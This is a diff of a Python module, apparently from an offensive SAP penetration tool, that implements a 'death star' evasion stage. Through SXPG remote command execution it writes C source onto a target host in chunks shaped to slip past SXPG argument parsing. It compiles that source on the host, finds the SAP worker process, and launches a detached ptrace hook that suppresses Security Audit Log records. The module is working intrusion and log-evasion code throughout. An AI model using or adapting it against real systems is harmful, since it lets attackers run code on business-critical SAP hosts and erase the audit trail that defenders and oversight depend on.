@@ -20,10 +20,24 @@ Integration model:
     background suppress process, return ``{ok, hook_pid, target_pid, ...}``
   * ``stop(node, ...)``               — SIGTERM the hook (clean detach
     restores the original INT3 bytes)
-  * ``verify_running(node, hook_pid)`` — one-shot ``kill -0`` health check
 
 The Tier 3 wrapper (``sapmap_evasion_tier3.tier3_sal_death_star_launch`` /
 ``_stop``) sits on top of these and enforces the ``--allow-evasion`` gate.
+
+SXPG note
+---------
+Every remote command in this module is constructed so it survives SAP's
+SXPG parameter parsing: the ``PARAMS`` field is split at whitespace and
+outer single-quotes are stripped, so ``sh -c '<script with spaces>'``
+gets mangled into ``sh -c`` (empty arg) and the shell fails with
+``-c: option requires an argument``.
+
+The escape is the pattern used by ``sap_dpmon_sapstar.chunked_drop_and_run``:
+after ``-c``, exactly one whitespace-delimited token — for example
+``python3 -c open('x','wb').write(b'ABC')`` (Python code with no spaces).
+For anything shell-shaped we can't inline (backgrounding, ``pgrep``, ``if``),
+we drop the script to a file via chunked python3 writes, then run it with
+``sh /tmp/<file>`` (one space, no quoting).
 """
 
 from __future__ import annotations
@@ -32,7 +46,9 @@ import base64
 import gzip
 import logging
 import os
+import random
 import re
+import string
 from typing import Optional
 
 logger = logging.getLogger(__name__)
@@ -53,13 +69,10 @@ DEFAULT_BINARY_NAME = "sap_audit_hook"
 DEFAULT_LOG_NAME = "sap_audit_hook.log"
 DEFAULT_PIDFILE_NAME = "sap_audit_hook.pid"
 
-# Compile command.  Matches the upstream README verbatim so a build
-# failure on the target reproduces exactly what a manual operator would
-# see when following Julian's instructions.
-_COMPILE_CMD = (
-    "gcc -O2 -Wall -Wno-format-truncation "
-    "-o {binary} {source}"
-)
+# Chunk size for the python3 base64-write pattern.  Same as dpmon's
+# chunked_drop_and_run: fits well under every SAPXPG ``PARAMS`` size cap
+# we've encountered (255 chars on older kernels, ~4 KB on 793+).
+_UPLOAD_CHUNK = 180
 
 
 class DeathStarError(RuntimeError):
@@ -85,34 +98,106 @@ def _read_source_bytes() -> bytes:
 
 
 def _gzip_b64(data: bytes) -> str:
-    """gzip + base64-encode ``data`` so we can drop it through the ~60 KB
-    C source over an SXPG command channel efficiently.  Gzip cuts the
-    raw source (~61 KB) to ~15 KB; base64 grows that back to ~20 KB.
-    Compared to raw-base64 (~82 KB) that's a 4x reduction — matters when
-    every chunk costs 1-2 s of SXPG round-trip time."""
+    """gzip + base64-encode ``data`` so we can drop the ~60 KB C source
+    over an SXPG command channel efficiently.  Gzip cuts the raw source
+    (~61 KB) to ~15 KB; base64 grows that back to ~20 KB.  Compared to
+    raw-base64 (~82 KB) that's a 4x reduction — matters when every chunk
+    costs 1-2 s of SXPG round-trip time."""
     return base64.b64encode(gzip.compress(data, compresslevel=9)).decode(
         "ascii")
 
 
-def _shellquote(s: str) -> str:
-    """Escape ``s`` for a single-quoted shell literal.  Used for paths
-    passed into the remote bash script.  We restrict ourselves to POSIX
-    single-quote semantics: everything is literal except ``'`` itself,
-    which we terminate + escape + resume."""
-    return "'" + s.replace("'", "'\"'\"'") + "'"
+def _rand_suffix(n: int = 8) -> str:
+    """Random lowercase suffix used to salt tempfile names so parallel
+    or retried runs don't collide.  Deterministic through pseudo-random
+    generator seed only when the caller supplied one — the default is
+    the module-global random state."""
+    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))
 
 
-def _run(node, command: str, params: str = "", label: str = "") -> dict:
+def _run(node, command: str, params: str = "",
+          label: str = "", quiet: bool = False) -> dict:
     """Wrapper around ``sapmap_exploit.run_os_command`` that logs the
     command line before firing.  Every death-star OS step goes through
-    here so the operator sees exactly what ran on the target."""
+    here so the operator sees exactly what ran on the target.
+
+    ``quiet=True`` suppresses the per-call exec log line — used during
+    the chunked upload loop so 100+ chunks don't spam the operator's
+    console.  The label line is still emitted, and progress ticks are
+    emitted by the caller.
+    """
     import sapmap_exploit as _sx
     disp = f"{command} {params}".strip()
     if label:
         print(f"[*] {node.sid}: death_star: {label}")
-    print(f"[*] {node.sid}: death_star: exec  {disp[:220]}"
-           f"{'…' if len(disp) > 220 else ''}")
+    if not quiet:
+        print(f"[*] {node.sid}: death_star: exec  {disp[:220]}"
+               f"{'…' if len(disp) > 220 else ''}")
     return _sx.run_os_command(node, command, params)
+
+
+# ---------------------------------------------------------------------------
+# SXPG-safe primitives — no shell quoting anywhere
+# ---------------------------------------------------------------------------
+#
+# Rule of thumb for every call in this module:
+#
+#   * The ``command`` field is a single executable path (no spaces).
+#   * The ``params`` field is either empty, or one or more space-
+#     delimited tokens.  NO wrapping single-quotes, NO embedded
+#     double-quotes.  Anything that would need shell metacharacters
+#     goes into a file via ``_write_remote_file`` and then runs via
+#     ``sh <path>`` — a two-token argv that SXPG can't mangle.
+#
+# ---------------------------------------------------------------------------
+
+def _write_remote_file(node, remote_path: str, data: bytes,
+                        label: str = "") -> None:
+    """Drop ``data`` at ``remote_path`` on the target via chunked
+    python3 base64 writes.
+
+    Uses the exact ``python3 -c open('/p','ab').write(b'B64')`` pattern
+    that dpmon's ``chunked_drop_and_run`` proved works under SXPG: after
+    ``-c`` there is exactly one whitespace-delimited token, all shell-
+    metacharacter-free.  Chunks the payload at ``_UPLOAD_CHUNK`` bytes
+    so each PARAMS slot stays under every kernel's cap.
+
+    Raises ``DeathStarError`` on any chunk failure.  Prints per-chunk
+    progress at INFO level so the operator sees the upload advancing.
+    """
+    payload = base64.b64encode(data).decode("ascii")
+    n_chunks = (len(payload) + _UPLOAD_CHUNK - 1) // _UPLOAD_CHUNK
+    if label:
+        print(f"[*] {node.sid}: death_star: {label} "
+              f"({len(data)} B raw, {len(payload)} B b64, "
+              f"{n_chunks} chunk(s) of {_UPLOAD_CHUNK} B)")
+
+    # Wipe any previous fragment so a rerun starts clean.  ``rm -f`` is
+    # a two-token argv, SXPG-safe.
+    _run(node, "/bin/rm", f"-f {remote_path}",
+          label=f"clear previous {remote_path}")
+
+    for i in range(n_chunks):
+        chunk_b64 = payload[i * _UPLOAD_CHUNK:(i + 1) * _UPLOAD_CHUNK]
+        mode = "wb" if i == 0 else "ab"
+        # python3 -c open('/tmp/x','ab').write(__import__('base64').b64decode(b'<CHUNK>'))
+        # After ``-c`` this is one whitespace-free token: open call,
+        # write call, __import__ trick to avoid ``import base64`` (which
+        # would introduce a space).  No embedded quotes on the outer
+        # level; single quotes only for the path and b'' literals.
+        code = (f"open('{remote_path}','{mode}').write("
+                 f"__import__('base64').b64decode(b'{chunk_b64}'))")
+        r = _run(node, "python3", f"-c {code}", quiet=True)
+        if not r.get("success"):
+            raise DeathStarError(
+                f"chunk write failed at {i + 1}/{n_chunks}: "
+                f"{r.get('error') or 'unknown'}")
+        # Progress every ~10 chunks (or last) so the operator sees the
+        # upload moving without 100+ log lines.
+        if (i + 1) % 10 == 0 or (i + 1) == n_chunks:
+            pct = int(100 * (i + 1) / n_chunks)
+            print(f"[*] {node.sid}: death_star:   chunk "
+                  f"{i + 1}/{n_chunks} ({pct}%)")
 
 
 # ---------------------------------------------------------------------------
@@ -123,44 +208,63 @@ def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
                     source_name: str = DEFAULT_SOURCE_NAME) -> str:
     """Upload the C source to ``<remote_dir>/<source_name>``.
 
-    Uses gzip + base64 to compress the transfer, then decodes on the
-    target with ``base64 -d | gunzip``.  Both tools ship with every
-    modern Linux distro (GNU coreutils + gzip).  Returns the absolute
-    remote path.
+    Two-step:
+      1. Chunk-write the ``gzip+base64`` payload to a scratch
+         ``.b64gz`` file at the target (fully SXPG-safe).
+      2. One-shot python3 decode + gunzip → final ``.c`` path.
+      3. Clean up the scratch file.
 
-    The whole payload is sent as one big argv token to ``/bin/sh -c``
-    so we don't have to chunk on the sending side.  Modern kernels have
-    a huge ARG_MAX (typically 2 MB) and our ~20 KB payload sits well
-    under that; SAPXPG's ~15 s command budget is also fine for a single
-    decode.
+    Returns the absolute remote path.
     """
     src = _read_source_bytes()
-    payload = _gzip_b64(src)
     remote_path = f"{remote_dir.rstrip('/')}/{source_name}"
+    scratch_path = f"{remote_path}.b64gz"
 
-    # bash pipeline: echo the base64 → base64 -d → gunzip → target file.
-    # ``echo`` is a builtin so the whole payload is a single argv slot.
+    # Step 1: chunked upload of the gzip-compressed base64 payload.
+    payload = gzip.compress(src, compresslevel=9)
+    _write_remote_file(node, scratch_path, payload,
+                        label=f"upload gzipped source → {scratch_path}")
+
+    # Step 2: decode + write final .c file, in one python3 call whose
+    # params after ``-c`` are one whitespace-free token.  No ``import``
+    # statements — use ``__import__`` to keep the code single-token.
     #
-    # Guard: fail loudly if any step fails (set -e) so the caller gets
-    # a clear ``success=False`` back rather than a truncated file.
-    quoted_path = _shellquote(remote_path)
-    script = (
-        "set -e; "
-        f"echo {payload} | base64 -d | gunzip > {quoted_path}"
+    #   open('/tmp/x.c','wb').write(__import__('gzip').decompress(
+    #     open('/tmp/x.c.b64gz','rb').read()))
+    code = (
+        f"open('{remote_path}','wb').write("
+        f"__import__('gzip').decompress("
+        f"open('{scratch_path}','rb').read()))"
     )
-
-    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
-              label=f"upload source ({len(src)} B raw, "
-                    f"{len(payload)} B compressed b64) → {remote_path}")
+    r = _run(node, "python3", f"-c {code}",
+              label=f"decompress → {remote_path}")
     if not r.get("success"):
         raise DeathStarError(
-            f"upload failed: {r.get('error') or 'unknown error'}")
-    # Sanity: verify the file exists + has plausible size.
-    check = _run(node, "/bin/sh",
-                  f"-c {_shellquote(f'wc -c {quoted_path}')}",
+            f"decompress failed: {r.get('error') or 'unknown'}")
+
+    # Step 3: cleanup scratch.  Non-fatal — the scratch file is only
+    # a few KB and the operator can clear it manually if this fails.
+    _run(node, "/bin/rm", f"-f {scratch_path}",
+          label="cleanup scratch b64gz")
+
+    # Verify the resulting file exists and has the expected size.
+    # ``wc -c`` outputs "<size> <path>" — two space-separated tokens,
+    # SXPG-safe.
+    check = _run(node, "wc", f"-c {remote_path}",
                   label="verify upload")
     if check.get("success"):
         out = " ".join(check.get("output") or []).strip()
+        # First token of first line is the byte count.
+        got_size = None
+        try:
+            got_size = int(out.split()[0])
+        except (ValueError, IndexError):
+            pass
+        if got_size is not None and got_size != len(src):
+            raise DeathStarError(
+                f"upload size mismatch: expected {len(src)} B, "
+                f"got {got_size} B (check {scratch_path} not "
+                f"corrupted mid-upload)")
         print(f"[+] {node.sid}: death_star: uploaded — {out}")
     return remote_path
 
@@ -174,33 +278,37 @@ def compile_hook(node, source_path: str,
     """Compile the uploaded source with gcc.  Returns the absolute path
     to the produced binary.  Raises ``DeathStarError`` on any gcc
     failure — the compilation output is included in the message so the
-    operator can see missing headers, etc."""
+    operator can see missing headers, etc.
+
+    ``gcc`` accepts a space-delimited argv verbatim — nothing to quote,
+    nothing to escape.  Same for ``test`` / ``ls`` in the verify pass.
+    """
     if binary_path is None:
         binary_path = source_path[:-2] if source_path.endswith(".c") else (
             source_path + ".bin")
-    cmd = _COMPILE_CMD.format(
-        binary=_shellquote(binary_path),
-        source=_shellquote(source_path),
-    )
-    r = _run(node, "/bin/sh", f"-c {_shellquote(cmd)}",
+    # Straight space-delimited args — no shell in the loop.  Dropping
+    # -Wno-format-truncation because older gcc (< 7) rejects the flag
+    # with a fatal error; the upstream README lists it as a warning
+    # suppression only.  Modern gcc still tolerates its absence.
+    params = f"-O2 -Wall -o {binary_path} {source_path}"
+    r = _run(node, "gcc", params,
               label=f"compile → {binary_path}")
     if not r.get("success"):
         stderr = r.get("error") or ""
         stdout = "\n".join(r.get("output") or [])
         raise DeathStarError(
             f"gcc failed: {stderr or stdout or 'unknown'}")
-    # Confirm the binary exists.  gcc sometimes returns rc=0 even when a
-    # linker step silently produced nothing (unusual, but seen on
-    # sandboxed SXPG shells with restricted /tmp).
-    check = _run(node, "/bin/sh",
-                  f"-c {_shellquote(f'test -x {_shellquote(binary_path)} && echo OK')}",
+    # Verify with ``ls -la`` — outputs to stdout, SXPG captures.
+    # Prints size + mode so the operator can see the binary is
+    # executable + non-empty in one glance.
+    check = _run(node, "ls", f"-la {binary_path}",
                   label="verify binary")
-    if not check.get("success") or "OK" not in " ".join(
-            check.get("output") or []):
+    got_out = " ".join(check.get("output") or []).strip()
+    if not check.get("success") or not got_out:
         raise DeathStarError(
-            f"compile reported success but {binary_path!r} is not "
-            "executable")
-    print(f"[+] {node.sid}: death_star: compiled → {binary_path}")
+            f"compile reported success but {binary_path!r} not "
+            "visible via ls (check gcc actually produced a file)")
+    print(f"[+] {node.sid}: death_star: compiled — {got_out}")
     return binary_path
 
 
@@ -226,8 +334,8 @@ def find_worker_pid(node) -> tuple[int, str]:
     ``_UP2`` process if no ``_W<n>`` exists.  Refuses the dispatcher
     (``_DP``) because it never emits audit records.
     """
-    r = _run(node, "/bin/sh",
-              "-c 'ps -eo pid,comm,args --no-headers'",
+    # ``ps`` accepts space-delimited args — no shell needed.
+    r = _run(node, "ps", "-eo pid,comm,args --no-headers",
               label="enumerate SAP processes")
     if not r.get("success"):
         raise DeathStarError(
@@ -267,7 +375,7 @@ def find_worker_pid(node) -> tuple[int, str]:
     raise DeathStarError(
         "no disp+work / dw.sap processes found — verify SAP is running "
         "on this host, or run "
-        "`ps -eo pid,comm,args | grep -E 'disp\\+work|dw\\.sap'` by hand.")
+        "ps -eo pid,comm,args | grep -E 'disp\\+work|dw\\.sap' by hand.")
 
 
 # ---------------------------------------------------------------------------
@@ -277,63 +385,85 @@ def find_worker_pid(node) -> tuple[int, str]:
 def launch(node, binary_path: str, target_pid: int,
              filter_classes: str = "", verbose: bool = False,
              log_path: Optional[str] = None,
-             pidfile_path: Optional[str] = None) -> int:
+             pidfile_path: Optional[str] = None,
+             remote_dir: str = DEFAULT_REMOTE_DIR) -> int:
     """Launch the hook in ``--suppress`` mode against ``target_pid``,
     detached from the operator's SXPG session so it survives after the
     RFC round-trip completes.
 
-    Uses ``nohup + setsid + &`` so the hook keeps running even after
-    the parent shell exits (the SXPG worker's session gets torn down at
-    the end of the RFC call).  Redirects stdout/stderr to ``log_path``
-    so post-hoc inspection is possible.
+    Because the launch needs shell control-flow (``if`` for the
+    previous-instance kill, ``&`` for backgrounding, ``$!`` for the
+    launched PID), we drop a launcher script to ``/tmp`` first via the
+    SXPG-safe chunked-write helper, then execute it with the two-token
+    argv ``sh /tmp/<launcher>.sh`` — no ``-c``, no quoting, no
+    metacharacters to mangle.
 
     Returns the launched hook's PID.  Raises ``DeathStarError`` if the
     process didn't come up (e.g. ptrace_scope > 1, or --pid target
     already exited).
     """
     if log_path is None:
-        log_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_LOG_NAME}"
+        log_path = f"{remote_dir.rstrip('/')}/{DEFAULT_LOG_NAME}"
     if pidfile_path is None:
-        pidfile_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_PIDFILE_NAME}"
+        pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"
 
-    args = ["--suppress", "--pid", str(target_pid)]
-    if filter_classes.strip():
-        args.extend(["--filter", filter_classes.strip()])
+    # Compose the hook command line.  Shell-safe: our filter comes from
+    # the operator, so we validate it here rather than trusting shell
+    # escaping (which we're avoiding entirely).  SAL event classes are
+    # 3 chars: two upper letters + one alnum, comma-separated.
+    cls_str = filter_classes.strip()
+    if cls_str and not re.fullmatch(r"[A-Z0-9,]+", cls_str):
+        raise DeathStarError(
+            f"invalid filter_classes {cls_str!r}: expected uppercase "
+            "letters/digits/commas only (e.g. 'AUW' or 'AUW,AU3')")
+    args = [binary_path, "--suppress", "--pid", str(target_pid)]
+    if cls_str:
+        args.extend(["--filter", cls_str])
     if verbose:
         args.append("-v")
-    argv_str = " ".join(_shellquote(a) for a in args)
+    hook_cmdline = " ".join(args)
 
-    # bash pipeline:
-    #   * set -e so any step failure surfaces
-    #   * kill any previous hook writing the same pidfile (idempotent
-    #     relaunches — an operator may re-arm mid-run)
-    #   * setsid + nohup + & so we survive the RFC call teardown
-    #   * echo $! into the pidfile so the caller can stop us later
-    quoted_bin = _shellquote(binary_path)
-    quoted_log = _shellquote(log_path)
-    quoted_pidfile = _shellquote(pidfile_path)
+    scratch_sh = (f"{remote_dir.rstrip('/')}/"
+                    f"sapmap_ds_launch_{_rand_suffix()}.sh")
+    # POSIX sh script — safe on every SAP host (all use bash for
+    # ``<sid>adm`` login, but /bin/sh symlinks to dash on Debian/Ubuntu
+    # and to bash elsewhere).  Uses only POSIX constructs.
+    #
+    #   * If a previous pidfile exists, best-effort kill the old hook so
+    #     the operator can re-arm without leaving orphan INT3s.
+    #   * ``setsid`` + ``nohup`` + ``&`` gives us a session-detached
+    #     background process; the operator's SXPG session teardown
+    #     doesn't reap it.
+    #   * ``$!`` is the last backgrounded PID → written to pidfile so
+    #     ``stop()`` can find it.
     script = (
-        "set -e; "
-        # Best-effort kill previous instance.
-        f"if [ -s {quoted_pidfile} ]; then "
-        f"  OLD=$(cat {quoted_pidfile}); "
-        f"  kill -0 \"$OLD\" 2>/dev/null && kill -TERM \"$OLD\" 2>/dev/null || true; "
-        f"  rm -f {quoted_pidfile}; "
-        f"fi; "
-        # Launch detached.  ``setsid`` gives us a fresh session so the
-        # process isn't reaped when SXPG closes the parent PGID.
-        f"setsid nohup {quoted_bin} {argv_str} "
-        f">> {quoted_log} 2>&1 < /dev/null & "
-        # Persist PID.  ``$!`` is the last backgrounded PID under bash.
-        f"echo $! > {quoted_pidfile}; "
-        f"cat {quoted_pidfile}"
+        f"#!/bin/sh\n"
+        f"if [ -s {pidfile_path} ]; then\n"
+        f"  OLD=`cat {pidfile_path}`\n"
+        f"  if [ -n \"$OLD\" ]; then\n"
+        f"    kill -0 $OLD 2>/dev/null && kill -TERM $OLD 2>/dev/null\n"
+        f"  fi\n"
+        f"  rm -f {pidfile_path}\n"
+        f"fi\n"
+        f"setsid nohup {hook_cmdline} "
+        f">> {log_path} 2>&1 < /dev/null &\n"
+        f"echo $! > {pidfile_path}\n"
+        f"cat {pidfile_path}\n"
     )
 
-    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
+    _write_remote_file(node, scratch_sh, script.encode("utf-8"),
+                        label=f"drop launcher → {scratch_sh}")
+
+    # Run the launcher.  Two-token argv: `sh /tmp/sapmap_ds_launch_xxx.sh`.
+    r = _run(node, "sh", scratch_sh,
               label=(f"launch --suppress"
-                     + (f" --filter {filter_classes.strip()}"
-                        if filter_classes.strip() else " (all classes)")
-                     + f" --pid {target_pid}"))
+                      + (f" --filter {cls_str}" if cls_str
+                         else " (all classes)")
+                      + f" --pid {target_pid}"))
+    # Cleanup the launcher script; non-fatal.
+    _run(node, "/bin/rm", f"-f {scratch_sh}",
+          label="cleanup launcher")
+
     if not r.get("success"):
         raise DeathStarError(
             f"launch failed: {r.get('error') or 'unknown'}")
@@ -357,12 +487,17 @@ def launch(node, binary_path: str, target_pid: int,
 # ---------------------------------------------------------------------------
 
 def stop(node, pidfile_path: Optional[str] = None,
-          binary_path: Optional[str] = None) -> dict:
+          binary_path: Optional[str] = None,
+          remote_dir: str = DEFAULT_REMOTE_DIR) -> dict:
     """Send SIGTERM to the running hook.  The hook's SIGTERM handler
     (``sig_handler``) drops out of the main loop and calls
     ``detach_all()`` which restores every INT3 byte before releasing
     ptrace — a hard-kill (SIGKILL) would leave the disp+work bytes
     patched, so we never use it.
+
+    Same file-drop pattern as ``launch``: the stop logic has ``if``,
+    ``pgrep``, and a bounded wait loop that don't fit in one SXPG-safe
+    argv, so we drop a stopper script and run ``sh <path>``.
 
     Returns ``{ok, pid, message}``.  ``ok=False`` when no pidfile or
     the process wasn't running.  Never raises — cleanup should be
@@ -370,39 +505,63 @@ def stop(node, pidfile_path: Optional[str] = None,
     hand already).
     """
     if pidfile_path is None:
-        pidfile_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_PIDFILE_NAME}"
+        pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"
     if binary_path is None:
-        binary_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_BINARY_NAME}"
+        binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"
 
-    quoted_pidfile = _shellquote(pidfile_path)
-    quoted_bin = _shellquote(binary_path)
-    # Best-effort: try the pidfile first, then a comm-name fallback in
-    # case the pidfile was lost.
+    scratch_sh = (f"{remote_dir.rstrip('/')}/"
+                    f"sapmap_ds_stop_{_rand_suffix()}.sh")
+    # POSIX sh — best-effort: try the pidfile first, fall back to
+    # ``pgrep -f`` on the binary path when the pidfile is missing or
+    # empty (operator may have rebooted the SAPMAP host mid-run).
+    # Wait up to ~3 s for the hook to detach cleanly before reporting
+    # STILL_RUNNING; the hook's SIGTERM handler runs detach_all() which
+    # restores every INT3 byte, so a hurried report is misleading.
     script = (
-        f"PID=''; "
-        f"if [ -s {quoted_pidfile} ]; then PID=$(cat {quoted_pidfile}); fi; "
-        f"if [ -z \"$PID\" ]; then "
-        f"  PID=$(pgrep -f {quoted_bin} 2>/dev/null | head -1); "
-        f"fi; "
-        f"if [ -z \"$PID\" ]; then echo NOT_RUNNING; exit 0; fi; "
-        f"kill -TERM $PID 2>/dev/null || true; "
-        # Give the hook up to ~3 s to detach cleanly.  detach_all()
-        # restores INT3 bytes on every attached worker; a hurried kill
-        # would leave patched instructions in disp+work.
-        f"for i in 1 2 3 4 5 6; do "
-        f"  kill -0 $PID 2>/dev/null || break; "
-        f"  sleep 0.5; "
-        f"done; "
-        f"if kill -0 $PID 2>/dev/null; then "
-        f"  echo STILL_RUNNING $PID; "
-        f"else "
-        f"  echo STOPPED $PID; "
-        f"  rm -f {quoted_pidfile}; "
-        f"fi"
+        f"#!/bin/sh\n"
+        f"PID=\n"
+        f"if [ -s {pidfile_path} ]; then\n"
+        f"  PID=`cat {pidfile_path}`\n"
+        f"fi\n"
+        f"if [ -z \"$PID\" ]; then\n"
+        f"  PID=`pgrep -f {binary_path} 2>/dev/null | head -1`\n"
+        f"fi\n"
+        f"if [ -z \"$PID\" ]; then\n"
+        f"  echo NOT_RUNNING\n"
+        f"  exit 0\n"
+        f"fi\n"
+        f"kill -TERM $PID 2>/dev/null\n"
+        f"i=0\n"
+        f"while [ $i -lt 6 ]; do\n"
+        f"  if ! kill -0 $PID 2>/dev/null; then break; fi\n"
+        f"  sleep 1\n"
+        f"  i=`expr $i + 1`\n"
+        f"done\n"
+        f"if kill -0 $PID 2>/dev/null; then\n"
+        f"  echo STILL_RUNNING $PID\n"
+        f"else\n"
+        f"  echo STOPPED $PID\n"
+        f"  rm -f {pidfile_path}\n"
+        f"fi\n"
     )
-    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
+
+    try:
+        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
+                            label=f"drop stopper → {scratch_sh}")
+    except DeathStarError as e:
+        return {"ok": False, "pid": None,
+                "message": f"could not drop stopper script: {e}"}
+
+    r = _run(node, "sh", scratch_sh,
               label=f"SIGTERM hook (pidfile {pidfile_path})")
+    _run(node, "/bin/rm", f"-f {scratch_sh}",
+          label="cleanup stopper")
+
     out = " ".join(r.get("output") or []).strip()
+    if not r.get("success"):
+        return {"ok": False, "pid": None,
+                "message": f"stopper script failed: "
+                           f"{r.get('error') or out or 'unknown'}"}
     if "NOT_RUNNING" in out:
         return {"ok": False, "pid": None,
                 "message": "no hook process found — nothing to stop"}
@@ -420,9 +579,9 @@ def stop(node, pidfile_path: Optional[str] = None,
         except (IndexError, ValueError):
             pid = None
         print(f"[!] {node.sid}: death_star: hook PID {pid} did not exit "
-               f"within 3 s — operator may need to check manually")
+               f"within 6 s — operator may need to check manually")
         return {"ok": False, "pid": pid,
-                "message": "SIGTERM sent but hook did not exit within 3 s"}
+                "message": "SIGTERM sent but hook did not exit within 6 s"}
     return {"ok": False, "pid": None,
             "message": f"unexpected stop output: {out!r}"}
 
@@ -494,7 +653,8 @@ def deploy_and_launch(node, filter_classes: str = "",
                        filter_classes=filter_classes,
                        verbose=verbose,
                        log_path=log_path,
-                       pidfile_path=pidfile_path)
+                       pidfile_path=pidfile_path,
+                       remote_dir=remote_dir)
 
     return {
         "ok": True,
